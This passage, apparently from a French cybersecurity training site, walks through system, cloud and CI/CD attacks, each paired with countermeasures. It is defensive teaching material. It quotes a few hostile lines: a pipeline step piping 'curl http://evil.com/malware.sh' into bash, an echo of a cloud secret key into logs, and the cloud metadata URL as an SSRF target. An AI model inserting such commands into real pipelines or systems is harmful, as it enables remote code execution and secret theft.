(ISO, PCI DSS, etc.).\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg alt=\"Sch√©ma OWASP Top 10\" loading=\"lazy\" src=\"/images/articles/owasp-top10-mindmap.png\" title=\"OWASP Mindmap\"\u003e\u003c/p\u003e","title":"OWASP Top 10 (2021)"},{"content":"Attaques sur les syst√®mes Les attaques sur les syst√®mes visent directement le c≈ìur d‚Äôun environnement informatique : les postes utilisateurs, les serveurs, les conteneurs, le cloud et leurs m√©canismes de gestion.\nContrairement aux attaques purement r√©seau ou applicatives, elles ciblent l‚Äôex√©cution et le fonctionnement interne des machines, afin d‚Äôobtenir un contr√¥le durable, contourner les protections ou exploiter les ressources.\nOn y retrouve aussi bien des menaces ‚Äúclassiques‚Äù (malwares, ransomwares, rootkits) que des attaques plus avanc√©es (persistance firmware, exploitation du noyau, abus d‚ÄôIAM en cloud, compromission de pipelines CI/CD).\nLeur point commun : elles cherchent √† s‚Äôinstaller dans la dur√©e et √† offrir √† l‚Äôattaquant un levier puissant pour espionner, manipuler ou saboter l‚Äôinfrastructure.\nC‚Äôest pourquoi la pr√©vention repose √† la fois sur le durcissement technique (patchs, segmentation, contr√¥le d‚Äôint√©grit√©) et sur le monitoring permanent (EDR, d√©tection comportementale, journaux centralis√©s).\n1. Malware (virus, ver, trojan) 1. Situation de d√©part Un utilisateur t√©l√©charge une application gratuite (ex. lecteur vid√©o crack√©) sur un site douteux.\n2. Ce que fait l‚Äôattaquant Le programme contient un code malveillant. √Ä l‚Äôinstallation, il s‚Äôex√©cute en arri√®re-plan : keylogger, botnet, vol de fichiers. 3. Cons√©quence Vol d‚Äôinformations. Machine utilis√©e comme relais d‚Äôattaque. D√©gradation des performances. 4. Pourquoi c‚Äôest possible L‚Äôutilisateur ex√©cute un binaire sans v√©rifier sa provenance. Pas de contr√¥le antivirus ou de sandbox. 5. Contre-mesures ‚úÖ Antivirus / EDR Analyse les signatures et comportements. Pourquoi √ßa prot√®ge : d√©tecte et bloque le code malveillant avant ex√©cution. ‚úÖ Signatures num√©riques V√©rifier que le logiciel est sign√© par l‚Äô√©diteur. Pourquoi √ßa prot√®ge : un malware non sign√© est suspect et rejet√©. ‚úÖ Principe du moindre privil√®ge L‚Äôutilisateur n‚Äôest pas administrateur. Pourquoi √ßa prot√®ge : limite l‚Äôimpact du malware (pas de modifications syst√®me critiques). 2. Ransomware 1. Situation de d√©part Un employ√© ouvre une pi√®ce jointe pi√©g√©e re√ßue par email.\n2. Ce que fait l‚Äôattaquant Le programme chiffre tous les fichiers locaux et r√©seau. Un message s‚Äôaffiche : ‚ÄúPayez 5000‚Ç¨ en Bitcoin pour r√©cup√©rer vos donn√©es‚Äù. 3. Cons√©quence Perte d‚Äôacc√®s aux fichiers. Blocage complet de l‚Äôactivit√©. 4. Pourquoi c‚Äôest possible L‚Äôutilisateur ex√©cute un fichier non v√©rifi√©. Pas de segmentation r√©seau ‚Üí le malware chiffre aussi les partages. Pas de sauvegarde r√©cente. 5. Contre-mesures ‚úÖ Sauvegardes hors ligne Conserver une copie d√©connect√©e (offline ou immutable). Pourquoi √ßa prot√®ge : restauration possible m√™me si les syst√®mes sont chiffr√©s. ‚úÖ Segmentation r√©seau Limiter les partages entre postes. Pourquoi √ßa prot√®ge : emp√™che la propagation √† toute l‚Äôentreprise. ‚úÖ EDR (Endpoint Detection \u0026amp; Response) Surveille les comportements suspects (ex. chiffrement massif). Pourquoi √ßa prot√®ge : stoppe le processus avant qu‚Äôil n‚Äôinfecte tout. 33. Rootkit 1. Situation de d√©part Un serveur est compromis via une vuln√©rabilit√© logicielle.\n2. Ce que fait l‚Äôattaquant Il installe un rootkit qui modifie le noyau ou les processus syst√®me. Le rootkit cache sa pr√©sence (fichiers, processus, connexions). 3. Cons√©quence L‚Äôattaquant garde un acc√®s discret et persistant. D√©tection tr√®s difficile. 4. Pourquoi c‚Äôest possible Droits administrateur/root obtenus via une faille. Pas de contr√¥le d‚Äôint√©grit√© du syst√®me. 5. Contre-mesures ‚úÖ Secure Boot + TPM V√©rifie l‚Äôint√©grit√© du noyau au d√©marrage. Pourquoi √ßa prot√®ge : emp√™che le chargement d‚Äôun kernel modifi√©. ‚úÖ Outils de d√©tection d‚Äôanomalies Comparer les r√©sultats d‚ÄôAPI syst√®me avec un scan brut. Pourquoi √ßa prot√®ge : r√©v√®le les processus/fichiers cach√©s. ‚úÖ R√©installation propre En cas d‚Äôinfection, reconstruire le syst√®me depuis z√©ro. Pourquoi √ßa prot√®ge : √©limine totalement le rootkit. 4. Escalade de privil√®ges 1. Situation de d√©part Un utilisateur compromis a un compte avec droits limit√©s sur un serveur.\n2. Ce que fait l‚Äôattaquant Il exploite une faille (ex. SUID binaire mal configur√©, bug kernel). Il obtient des droits administrateur. 3. Cons√©quence Acc√®s complet au syst√®me. D√©sactivation des protections de s√©curit√©. 4. Pourquoi c‚Äôest possible Mauvaise configuration (droits trop √©lev√©s). Failles non corrig√©es dans le noyau ou les logiciels. 5. Contre-mesures ‚úÖ Patching r√©gulier Mettre √† jour kernel et logiciels. Pourquoi √ßa prot√®ge : supprime les vuln√©rabilit√©s connues. ‚úÖ Principe du moindre privil√®ge Limiter les droits des utilisateurs et services. Pourquoi √ßa prot√®ge : r√©duit l‚Äôimpact d‚Äôun compte compromis. ‚úÖ Monitoring et alerte Surveiller les tentatives d‚Äôutilisation d‚Äôoutils d‚Äôescalade. Pourquoi √ßa prot√®ge : d√©tection rapide avant compromission totale. 5. Backdoors 1. Situation de d√©part Un serveur est pirat√© et nettoy√© superficiellement.\n2. Ce que fait l‚Äôattaquant Il installe une porte d√©rob√©e (script webshell, compte cach√©). M√™me apr√®s restauration apparente, il garde un acc√®s. 3. Cons√©quence Compromission persistante. Reprise de contr√¥le apr√®s nettoyage. 4. Pourquoi c‚Äôest possible L‚Äôattaquant laisse un acc√®s discret. Les administrateurs ne v√©rifient pas l‚Äôint√©grit√© compl√®te du syst√®me. 5. Contre-mesures ‚úÖ V√©rification d‚Äôint√©grit√© Utiliser des hash/signatures sur les fichiers syst√®mes. Pourquoi √ßa prot√®ge : d√©tecte les modifications non autoris√©es. ‚úÖ R√©installation totale En cas de doute, reconstruire le syst√®me depuis une image propre. Pourquoi √ßa prot√®ge : supprime toute backdoor cach√©e. ‚úÖ Segmentation et logs centralis√©s Centraliser l‚Äôauthentification et la journalisation. Pourquoi √ßa prot√®ge : un compte cach√© local se voit vite dans les logs. 6. Supply Chain Attack (cha√Æne d‚Äôapprovisionnement) 1. Situation de d√©part Une entreprise t√©l√©charge une biblioth√®que open source pour son application.\n2. Ce que fait l‚Äôattaquant Il compromet le d√©p√¥t officiel ou publie une version corrompue. L‚Äôentreprise int√®gre le code malveillant sans s‚Äôen rendre compte. 3. Cons√©quence Espionnage des utilisateurs finaux. Vol de donn√©es sensibles via une d√©pendance tierce. 4. Pourquoi c‚Äôest possible Confiance aveugle dans les librairies externes. Absence de contr√¥le d‚Äôint√©grit√© ou d‚Äôaudit. 5. Contre-mesures ‚úÖ V√©rification de l‚Äôint√©grit√© Hashes, signatures GPG des packages. Pourquoi √ßa prot√®ge : d√©tecte une biblioth√®que modifi√©e. ‚úÖ D√©pendances v√©rifi√©es Auditer r√©guli√®rement les biblioth√®ques. Pourquoi √ßa prot√®ge : r√©duit le risque d‚Äôutiliser du code compromis. ‚úÖ SBOM (Software Bill of Materials) Maintenir une liste compl√®te des d√©pendances. Pourquoi √ßa prot√®ge : permet de r√©agir vite en cas de compromission d‚Äôun composant. 7. Variantes de Ransomware 1. Situation de d√©part Un employ√© re√ßoit une pi√®ce jointe pi√©g√©e et l‚Äôouvre.\nLe malware s‚Äôex√©cute sur son poste.\n2. Ce que fait l‚Äôattaquant Crypto-ransomware : chiffre les fichiers et exige une ran√ßon. Locker ransomware : verrouille totalement l‚Äô√©cran (acc√®s bloqu√©). Leakware : vole les fichiers avant de les chiffrer ‚Üí menace de les publier. 3. Cons√©quence Perte d‚Äôacc√®s aux fichiers. Risque de fuite publique des donn√©es sensibles. 4. Pourquoi c‚Äôest possible Pas de filtrage des pi√®ces jointes. Pas de sauvegarde d√©connect√©e. Droits trop √©lev√©s de l‚Äôutilisateur. 5. Contre-mesures ‚úÖ Segmentation des droits L‚Äôutilisateur ne doit pas avoir acc√®s √† tous les partages r√©seau. Pourquoi √ßa prot√®ge : limite la propagation du chiffrement. ‚úÖ Backups immuables Sauvegardes chiffr√©es et en lecture seule. Pourquoi √ßa prot√®ge : emp√™che l‚Äôattaquant de supprimer aussi les backups. ‚úÖ D√©tection comportementale Bloquer un processus qui ouvre et chiffre rapidement un grand nombre de fichiers. Pourquoi √ßa prot√®ge : arr√™te l‚Äôinfection en cours d‚Äôex√©cution. 8. Persistence (m√©canismes de survie) 1. Situation de d√©part Un attaquant a compromis un poste ou serveur.\n2. Ce que fait l‚Äôattaquant Installe un service Windows ou t√¢che planifi√©e. Ajoute une cl√© dans le registre (Run, RunOnce). Modifie un script de d√©marrage Linux (.bashrc, systemd). 3. Cons√©quence Le malware se relance apr√®s chaque red√©marrage. L‚Äôattaquant garde un acc√®s long terme. 4. Pourquoi c‚Äôest possible Syst√®mes configur√©s pour ex√©cuter automatiquement des scripts au boot. Manque de surveillance sur les services planifi√©s. 5. Contre-mesures ‚úÖ Monitoring de l‚Äôautostart Surveiller les registres Windows, t√¢ches cron/systemd. Pourquoi √ßa prot√®ge : d√©tecte toute entr√©e suspecte qui garantit la persistance. ‚úÖ EDR avec r√®gles YARA D√©tecte les modifications typiques de persistance. Pourquoi √ßa prot√®ge : alerte si un nouveau service/t√¢che anormal est ajout√©. ‚úÖ Golden image de r√©f√©rence Comparer l‚Äô√©tat du syst√®me avec une version propre. Pourquoi √ßa prot√®ge : identifie toute persistance introduite par l‚Äôattaquant. 9. Living-off-the-Land (LotL) 1. Situation de d√©part Un attaquant a un acc√®s limit√© √† un serveur Windows ou Linux.\n2. Ce que fait l‚Äôattaquant Utilise des outils natifs comme PowerShell, WMI, certutil.exe, bash, curl. Pas besoin de malware externe ‚Üí moins d√©tectable. 3. Cons√©quence Extraction de donn√©es. D√©ploiement de backdoors. Mouvement lat√©ral entre machines. 4. Pourquoi c‚Äôest possible Les outils l√©gitimes sont pr√©sents par d√©faut. Les antivirus ne bloquent pas leur usage normal. 5. Contre-mesures ‚úÖ Restriction d‚Äôusage des outils D√©sactiver ou limiter PowerShell, WMI si inutiles. Pourquoi √ßa prot√®ge : r√©duit la surface d‚Äôattaque disponible. ‚úÖ Logging renforc√© Activer logs d√©taill√©s PowerShell (Script Block Logging). Pourquoi √ßa prot√®ge : permet d‚Äôidentifier l‚Äôusage d√©tourn√© des outils natifs. ‚úÖ EDR avec d√©tection comportementale Rep√©rer l‚Äôusage suspect d‚Äôoutils syst√®me (ex. certutil t√©l√©chargeant un binaire). Pourquoi √ßa prot√®ge : bloque les abus sans bloquer les usages normaux. 10. Mouvement lat√©ral 1. Situation de d√©part Un attaquant a compromis un poste utilisateur via phishing.\n2. Ce que fait l‚Äôattaquant R√©cup√®re les hashs de mots de passe ou tickets Kerberos. Utilise Pass-the-Hash ou Pass-the-Ticket pour se connecter √† d‚Äôautres machines. Explore le r√©seau jusqu‚Äôaux serveurs critiques (AD, bases de donn√©es). 3. Cons√©quence Compromission d‚Äôun poste ‚Üí compromission de tout le domaine. Acc√®s aux comptes administrateurs. 4. Pourquoi c‚Äôest possible Les identifiants circulent sur le r√©seau (SSO, sessions ouvertes). Pas de segmentation r√©seau ni d‚Äôauthentification multi-facteur. 5. Contre-mesures ‚úÖ Segmentation r√©seau Isoler les machines critiques des postes utilisateurs. Pourquoi √ßa prot√®ge : emp√™che un simple poste compromis d‚Äôatteindre tout le r√©seau. ‚úÖ MFA pour les comptes admins Authentification forte pour toutes connexions distantes. Pourquoi √ßa prot√®ge : m√™me avec un hash vol√©, l‚Äôattaquant ne peut pas se connecter. ‚úÖ Monitoring Kerberos/NTLM D√©tecter Pass-the-Hash/Pass-the-Ticket (anomalies d‚Äôauthentification). Pourquoi √ßa prot√®ge : alerte d√®s les premiers mouvements lat√©raux. 11. Exploitation des ressources (Crypto-jacking) 1. Situation de d√©part Un serveur web mal configur√© ou vuln√©rable est compromis.\n2. Ce que fait l‚Äôattaquant Installe un mineur de cryptomonnaie (Monero, etc.). Utilise le CPU/GPU du serveur en arri√®re-plan. 3. Cons√©quence D√©gradation des performances. Factures d‚Äô√©lectricit√© ou cloud qui explosent. 4. Pourquoi c‚Äôest possible Vuln√©rabilit√©s non corrig√©es. Pas de monitoring des performances anormales. 5. Contre-mesures ‚úÖ Patch management Mettre √† jour logiciels et services. Pourquoi √ßa prot√®ge : ferme les failles utilis√©es pour installer le mineur. ‚úÖ Monitoring des ressources Surveiller CPU/GPU, usage anormal. Pourquoi √ßa prot√®ge : d√©tecte rapidement une activit√© de minage. ‚úÖ Limiter les privil√®ges Le serveur web ne doit pas avoir acc√®s root. Pourquoi √ßa prot√®ge : r√©duit la possibilit√© d‚Äôinstaller un mineur syst√®me. 12. Fileless Malware (malware sans fichier) 1. Situation de d√©part Un utilisateur clique sur un lien pi√©g√© dans un email.\n2. Ce que fait l‚Äôattaquant Au lieu d‚Äôinstaller un fichier, le code malveillant s‚Äôex√©cute directement en m√©moire (via PowerShell, WMI). Il ne laisse aucune trace sur le disque. 3. Cons√©quence Difficult√© √† d√©tecter par antivirus classiques. Contr√¥le furtif du syst√®me. 4. Pourquoi c‚Äôest possible Les outils natifs permettent d‚Äôex√©cuter du code en m√©moire. Pas de surveillance renforc√©e de ces outils. 5. Contre-mesures ‚úÖ EDR bas√© sur comportement D√©tecte des anomalies m√©moire (scripts PowerShell suspects). Pourquoi √ßa prot√®ge : alerte m√™me sans fichier pr√©sent. ‚úÖ D√©sactiver macros et ex√©cutions automatiques Ne pas autoriser l‚Äôex√©cution de scripts par d√©faut. Pourquoi √ßa prot√®ge : supprime le vecteur principal. ‚úÖ Segmentation des privil√®ges Un utilisateur compromis ne doit pas avoir de droits admin. Pourquoi √ßa prot√®ge : limite la port√©e du malware en m√©moire. 13. Credential Dumping (vol d‚Äôidentifiants en m√©moire) 1. Situation de d√©part Un attaquant a compromis une machine Windows avec un compte utilisateur standard.\n2. Ce que fait l‚Äôattaquant Utilise des outils comme Mimikatz pour lire la m√©moire LSASS. R√©cup√®re mots de passe en clair, hash NTLM, tickets Kerberos. 3. Cons√©quence Vol d‚Äôidentifiants d‚Äôutilisateurs et d‚Äôadmins. Mouvement lat√©ral dans le r√©seau. 4. Pourquoi c‚Äôest possible Windows stocke temporairement les secrets en m√©moire. Pas de protection renforc√©e du processus LSASS. 5. Contre-mesures ‚úÖ Credential Guard (Windows) Isole les secrets LSASS dans une machine virtuelle prot√©g√©e. Pourquoi √ßa prot√®ge : emp√™che leur extraction par un processus compromis. ‚úÖ Limitation des comptes admins Pas de sessions administrateurs sur les postes utilisateurs. Pourquoi √ßa prot√®ge : m√™me si compromis, pas d‚Äôidentifiants sensibles pr√©sents en m√©moire. ‚úÖ EDR D√©tecte l‚Äôusage d‚Äôoutils comme Mimikatz. Pourquoi √ßa prot√®ge : alerte imm√©diatement sur un dump de m√©moire suspect. 14. Attaques contre Active Directory (AD) 1. Situation de d√©part Une entreprise utilise AD pour g√©rer ses comptes et droits.\n2. Ce que fait l‚Äôattaquant Exploite des comptes privil√©gi√©s. Utilise Golden Ticket (faux ticket Kerberos avec cl√© du domaine). Peut s‚Äôattribuer des droits d‚Äôadmin √† vie. 3. Cons√©quence Compromission totale du domaine. Contr√¥le permanent des machines jointes √† l‚ÄôAD. 4. Pourquoi c‚Äôest possible Comptes admins mal prot√©g√©s. Cl√© Kerberos (KRBTGT) compromise. 5. Contre-mesures ‚úÖ Rotation r√©guli√®re de KRBTGT R√©g√©n√©rer la cl√© de signature Kerberos. Pourquoi √ßa prot√®ge : invalide les Golden Tickets g√©n√©r√©s. ‚úÖ Tiering des acc√®s S√©parer les comptes admin, user, et service. Pourquoi √ßa prot√®ge : r√©duit la surface d‚Äôattaque. ‚úÖ Monitoring AD D√©tecter anomalies d‚Äôauthentification Kerberos. Pourquoi √ßa prot√®ge : identifie des tickets suspects (longue dur√©e, anomalies). 15. Kernel Exploits (exploitation du noyau) 1. Situation de d√©part Un attaquant a un acc√®s limit√© √† une machine Linux/Windows.\n2. Ce que fait l‚Äôattaquant Exploite une vuln√©rabilit√© kernel (buffer overflow, use-after-free). Ex√©cute du code en mode kernel. 3. Cons√©quence Escalade de privil√®ges ‚Üí root/system. D√©sactivation des protections de s√©curit√©. 4. Pourquoi c‚Äôest possible Kernel non patch√©. Vuln√©rabilit√©s logicielles non corrig√©es. 5. Contre-mesures ‚úÖ Patch management Mettre √† jour rapidement kernel et drivers. Pourquoi √ßa prot√®ge : ferme les failles exploitables. ‚úÖ ASLR + DEP Randomisation et protection m√©moire activ√©es. Pourquoi √ßa prot√®ge : complique l‚Äôexploitation du bug. ‚úÖ Sandbox / VM Isoler les applications √† risque. Pourquoi √ßa prot√®ge : limite l‚Äôacc√®s au kernel. 16. Persistence firmware / UEFI 1. Situation de d√©part Un attaquant a compromis une machine critique et veut garder un acc√®s permanent.\n2. Ce que fait l‚Äôattaquant Modifie le firmware UEFI ou BIOS. Installe un rootkit bas-niveau invisible aux antivirus. 3. Cons√©quence Persistance m√™me apr√®s r√©installation du syst√®me. Contr√¥le total √† chaque boot. 4. Pourquoi c‚Äôest possible Firmware non sign√© ou non v√©rifi√©. Pas de Secure Boot activ√©. 5. Contre-mesures ‚úÖ Secure Boot V√©rifie la signature du firmware et du bootloader. Pourquoi √ßa prot√®ge : emp√™che l‚Äôex√©cution d‚Äôun firmware modifi√©. ‚úÖ TPM (Trusted Platform Module) Stocke une empreinte cryptographique du boot. Pourquoi √ßa prot√®ge : alerte si le firmware a chang√©. ‚úÖ Firmware updates s√©curis√©s Installer les mises √† jour des constructeurs. Pourquoi √ßa prot√®ge : corrige les failles UEFI/BIOS. 17. Attaques via services expos√©s (RDP, SSH, SMB) 1. Situation de d√©part Une entreprise expose son RDP (Remote Desktop) directement sur Internet.\n2. Ce que fait l‚Äôattaquant Lance un bruteforce ou exploite une vuln√©rabilit√© (ex. BlueKeep). Obtient un acc√®s distant complet. 3. Cons√©quence Prise de contr√¥le du serveur. D√©ploiement de malwares/ransomware. 4. Pourquoi c‚Äôest possible Services critiques expos√©s directement. Pas de filtrage ni MFA. 5. Contre-mesures ‚úÖ Pas d‚Äôexposition directe Passer par un VPN ou un bastion. Pourquoi √ßa prot√®ge : seuls les utilisateurs l√©gitimes peuvent atteindre RDP/SSH. ‚úÖ MFA obligatoire Ajouter un facteur d‚Äôauthentification pour chaque session distante. Pourquoi √ßa prot√®ge : m√™me si mot de passe vol√©, acc√®s bloqu√©. ‚úÖ Filtrage IP et honeypots Limiter les IP autoris√©es, surveiller les tentatives suspectes. Pourquoi √ßa prot√®ge : r√©duit la surface et alerte sur les attaques. 18. Keylogging 1. Situation de d√©part Un utilisateur installe un programme gratuit sans v√©rification.\n2. Ce que fait l‚Äôattaquant Le logiciel installe un keylogger en arri√®re-plan. Il enregistre toutes les frappes clavier. 3. Cons√©quence Vol de mots de passe. R√©cup√©ration de conversations priv√©es. 4. Pourquoi c‚Äôest possible L‚Äôutilisateur ex√©cute du code non v√©rifi√©. Pas d‚Äôantivirus ou sandbox. 5. Contre-mesures ‚úÖ Antivirus/EDR D√©tecte les comportements de keylogging. Pourquoi √ßa prot√®ge : bloque la capture des frappes. ‚úÖ Virtual Keyboard / MFA Utiliser claviers virtuels pour les mots de passe critiques. Pourquoi √ßa prot√®ge : rend plus difficile la capture d‚Äôidentifiants sensibles. ‚úÖ Moindre privil√®ge Le keylogger ne doit pas pouvoir s‚Äôinstaller sans admin. Pourquoi √ßa prot√®ge : r√©duit les risques d‚Äôinstallation furtive. 19. VM Escape (√©vasion de machine virtuelle) 1. Situation de d√©part Une entreprise utilise un hyperviseur (VMware, Hyper-V, KVM) pour h√©berger plusieurs VM.\nChaque VM est cens√©e √™tre isol√©e.\n2. Ce que fait l‚Äôattaquant Il exploite une vuln√©rabilit√© de l‚Äôhyperviseur (ex. bug dans la gestion m√©moire). Il sort de sa VM et obtient un acc√®s √† l‚Äôh√¥te physique. De l√†, il peut attaquer les autres VM. 3. Cons√©quence Compromission de plusieurs serveurs clients. Perte totale de l‚Äôisolation entre locataires. 4. Pourquoi c‚Äôest possible L‚Äôhyperviseur est un logiciel complexe, donc vuln√©rable. Les failles critiques (ex. VMware Escape, Xen Escape) existent r√©guli√®rement. 5. Contre-mesures ‚úÖ Patch hyperviseur rapidement Appliquer les correctifs de s√©curit√© d√®s leur sortie. Pourquoi √ßa prot√®ge : ferme les failles connues avant exploitation. ‚úÖ Isolation stricte des workloads S√©parer les environnements sensibles (prod/test) sur des hyperviseurs diff√©rents. Pourquoi √ßa prot√®ge : limite l‚Äôimpact si une VM s‚Äô√©vade. ‚úÖ Monitoring h√¥te/VM Surveiller les anomalies dans la communication VM ‚Üî hyperviseur. Pourquoi √ßa prot√®ge : d√©tecte une tentative d‚Äô√©vasion. 20. Container Breakout (√©vasion de conteneur) 1. Situation de d√©part Une application est d√©ploy√©e dans un conteneur Docker/Kubernetes.\nLe conteneur est cens√© √™tre isol√© de l‚Äôh√¥te.\n2. Ce que fait l‚Äôattaquant Exploite une vuln√©rabilit√© du runtime (Docker, containerd). Ou abuse de privil√®ges trop √©lev√©s (--privileged, montages /var/run/docker.sock). Il sort du conteneur et acc√®de √† l‚Äôh√¥te. 3. Cons√©quence Contr√¥le de l‚Äôh√¥te Kubernetes ou Docker. Compromission de tous les autres conteneurs. 4. Pourquoi c‚Äôest possible Isolation bas√©e sur namespaces Linux, pas aussi forte qu‚Äôune VM. Mauvaises configurations (conteneurs root, privil√®ges trop ouverts). 5. Contre-mesures ‚úÖ Principe du moindre privil√®ge Ne jamais lancer un conteneur en root. Pourquoi √ßa prot√®ge : r√©duit l‚Äôimpact en cas de compromission. ‚úÖ Politiques PodSecurity / AppArmor / SELinux Limiter les capacit√©s Linux utilisables par un conteneur. Pourquoi √ßa prot√®ge : emp√™che d‚Äôacc√©der √† des ressources critiques de l‚Äôh√¥te. ‚úÖ S√©curit√© du runtime Surveiller les appels syst√®me (seccomp). Pourquoi √ßa prot√®ge : bloque des comportements anormaux (ex. chargement de modules noyau). 21. IAM Abuse (abus des r√¥les et permissions) 1. Situation de d√©part Une entreprise utilise AWS, Azure ou GCP.\nLes comptes IAM (Identity \u0026amp; Access Management) attribuent les droits aux services et utilisateurs.\n2. Ce que fait l‚Äôattaquant Il obtient une cl√© API expos√©e (dans GitHub, logs, image Docker). La cl√© a des droits trop √©lev√©s (ex. admin global). Il acc√®de √† tout l‚Äôenvironnement cloud. 3. Cons√©quence Suppression ou vol de ressources. D√©ploiement de backdoors (nouveaux comptes IAM). Extraction de donn√©es sensibles (S3, buckets, blobs). 4. Pourquoi c‚Äôest possible Mauvaise gestion des permissions (‚Äú* admin partout‚Äù). Absence de rotation ou de protection des cl√©s API. 5. Contre-mesures ‚úÖ Principe du moindre privil√®ge (IAM) Attribuer uniquement les droits n√©cessaires. Pourquoi √ßa prot√®ge : limite l‚Äôimpact d‚Äôune cl√© compromise. ‚úÖ Rotation et audit des cl√©s Changer r√©guli√®rement les cl√©s IAM, activer MFA. Pourquoi √ßa prot√®ge : r√©duit la dur√©e d‚Äôexploitation d‚Äôune fuite. ‚úÖ D√©tection d‚Äôanomalies IAM Activer GuardDuty (AWS), Defender (Azure). Pourquoi √ßa prot√®ge : alerte en cas d‚Äôusage anormal d‚Äôune cl√©. 22. Secrets dans Metadata Services 1. Situation de d√©part Une application dans le cloud (AWS EC2, GCP Compute) peut interroger l‚ÄôURL interne :\nhttp://169.254.169.254/latest/meta-data/\n‚Üí qui contient des tokens IAM.\n2. Ce que fait l‚Äôattaquant Il trouve une vuln√©rabilit√© SSRF sur l‚Äôapp. Il force l‚Äôapplication √† requ√™ter l‚ÄôURL metadata. Il r√©cup√®re les tokens IAM temporaires. 3. Cons√©quence L‚Äôattaquant obtient des acc√®s cloud avec les permissions de l‚Äôinstance. Peut voler, supprimer ou modifier des ressources. 4. Pourquoi c‚Äôest possible Les metadata services sont accessibles depuis toute l‚Äôinstance. Pas de restriction par d√©faut. 5. Contre-mesures ‚úÖ IMDSv2 (AWS) ou √©quivalents Exige des requ√™tes sign√©es et authentifi√©es. Pourquoi √ßa prot√®ge : emp√™che l‚Äôexploitation via SSRF simple. ‚úÖ Limiter les r√¥les IAM attach√©s aux VM Donner uniquement les droits strictement n√©cessaires. Pourquoi √ßa prot√®ge : m√™me si le token est vol√©, l‚Äôimpact est r√©duit. ‚úÖ Firewalls locaux Bloquer l‚Äôacc√®s direct aux adresses metadata. Pourquoi √ßa prot√®ge : m√™me avec SSRF, pas d‚Äôacc√®s au service de m√©tadonn√©es. 23. Misconfiguration Storage (S3 buckets, Azure blobs) 1. Situation de d√©part Une √©quipe utilise un bucket S3 pour stocker des documents internes.\nIl est mal configur√© : ‚Äúpublic read‚Äù.\n2. Ce que fait l‚Äôattaquant Il scanne Internet √† la recherche de buckets ouverts. Il t√©l√©charge les documents (factures, backups, donn√©es clients). 3. Cons√©quence Exposition massive de donn√©es sensibles. Risque RGPD, r√©putation. 4. Pourquoi c‚Äôest possible Configuration par d√©faut permissive. Manque de revue de configuration s√©curit√©. 5. Contre-mesures ‚úÖ Block Public Access (AWS) / √©quivalents Forcer tous les buckets √† rester priv√©s sauf exception. Pourquoi √ßa prot√®ge : emp√™che l‚Äôexposition accidentelle. ‚úÖ Policies IAM pr√©cises Autoriser uniquement des utilisateurs/roles d√©finis. Pourquoi √ßa prot√®ge : contr√¥le fin des acc√®s aux ressources. ‚úÖ Audit automatis√© Outils comme AWS Config, GCP Security Scanner. Pourquoi √ßa prot√®ge : d√©tecte imm√©diatement un bucket expos√©. 24. Compromission de pipeline CI/CD 1. Situation de d√©part Une entreprise utilise GitLab CI pour d√©ployer automatiquement son application en production.\nLe pipeline utilise des scripts stock√©s dans .gitlab-ci.yml.\n2. Ce que fait l‚Äôattaquant Il pousse un commit malveillant modifiant le pipeline : script: curl http://evil.com/malware.sh | bash Le pipeline ex√©cute le code malveillant avec les droits du runner. 3. Cons√©quence D√©ploiement d‚Äôun backdoor en production. Compromission des serveurs de build. 4. Pourquoi c‚Äôest possible Pas de revue de code obligatoire sur les fichiers de configuration CI/CD. Les runners ont acc√®s √† des secrets (API keys, credentials). 5. Contre-mesures ‚úÖ Revue obligatoire des pipelines Les modifications CI/CD doivent √™tre valid√©es par plusieurs reviewers. Pourquoi √ßa prot√®ge : emp√™che qu‚Äôun attaquant injecte du code sans contr√¥le. ‚úÖ Isolation des runners Runners CI/CD d√©di√©s, avec peu de privil√®ges. Pourquoi √ßa prot√®ge : m√™me si compromis, l‚Äôimpact est limit√©. ‚úÖ Rotation des secrets Les secrets utilis√©s par les pipelines doivent √™tre √©ph√©m√®res. Pourquoi √ßa prot√®ge : un secret vol√© ne reste pas exploitable longtemps. 25. Vol de secrets dans le pipeline 1. Situation de d√©part Un pipeline CI/CD stocke des cl√©s API et mots de passe dans des variables d‚Äôenvironnement.\n2. Ce que fait l‚Äôattaquant Il modifie le script du pipeline pour afficher les variables : bash\recho $AWS_SECRET_KEY Les secrets apparaissent dans les logs. 3. Cons√©quence Vol de cl√©s cloud / credentials internes. Exploitation de l‚Äôinfrastructure externe (AWS, Azure, GitHub). 4. Pourquoi c‚Äôest possible Secrets stock√©s en clair dans les environnements CI/CD. Logs accessibles aux d√©veloppeurs. 5. Contre-mesures ‚úÖ Gestion s√©curis√©e des secrets Utiliser un coffre-fort (Vault, AWS Secrets Manager). Pourquoi √ßa prot√®ge : les secrets ne sont jamais expos√©s en clair. ‚úÖ Masquage des variables Configurer le CI/CD pour ne pas afficher les secrets dans les logs. Pourquoi √ßa prot√®ge : √©vite leur fuite par erreur. ‚úÖ Rotation r√©guli√®re Les cl√©s doivent expirer automatiquement. Pourquoi √ßa prot√®ge : limite la dur√©e d‚Äôexploitation d‚Äôun secret compromis. 26. Compromission de registres d‚Äôimages (Docker Registry) 1. Situation de d√©part L‚Äôentreprise stocke ses images Docker dans un registre priv√© (Harbor, ECR, GitHub Container Registry).\n2. Ce que fait l‚Äôattaquant Il obtient un acc√®s au registre (via credentials vol√©s). Il pousse une image malveillante avec un tag l√©gitime (latest). Les d√©veloppeurs la d√©ploient sans s‚Äôen douter. 3. Cons√©quence Backdoor dans tous les conteneurs d√©ploy√©s. Espionnage ou exfiltration de donn√©es. 4. Pourquoi c‚Äôest possible Pas de contr√¥le d‚Äôint√©grit√© des images. Pas de signature ni v√©rification cryptographique. 5. Contre-mesures ‚úÖ Signature des images (Docker Content Trust / Notary / Cosign) Les images sont sign√©es avec une cl√© priv√©e. Pourquoi √ßa prot√®ge : impossible de substituer une image sans casser la signature. ‚úÖ Scanning des images V√©rification automatique des vuln√©rabilit√©s (Trivy, Clair). Pourquoi √ßa prot√®ge : r√©duit le risque d‚Äôexploiter une image corrompue. ‚úÖ Contr√¥le d‚Äôacc√®s strict Acc√®s en √©criture limit√© au registre. Pourquoi √ßa prot√®ge : emp√™che l‚Äôinjection malveillante. 27. Injection de d√©pendances (Dependency Confusion) 1. Situation de d√©part L‚Äôentreprise a des packages internes (ex. mypackage-internal) utilis√©s dans ses builds Node.js ou Python.\n2. Ce que fait l‚Äôattaquant Il publie un package du m√™me nom sur le registre public (npm, PyPI). Le gestionnaire de d√©pendances t√©l√©charge celui du public au lieu de l‚Äôinterne. 3. Cons√©quence Ex√©cution de code malveillant lors de l‚Äôinstallation. Vol de secrets depuis les pipelines CI/CD. 4. Pourquoi c‚Äôest possible Les gestionnaires 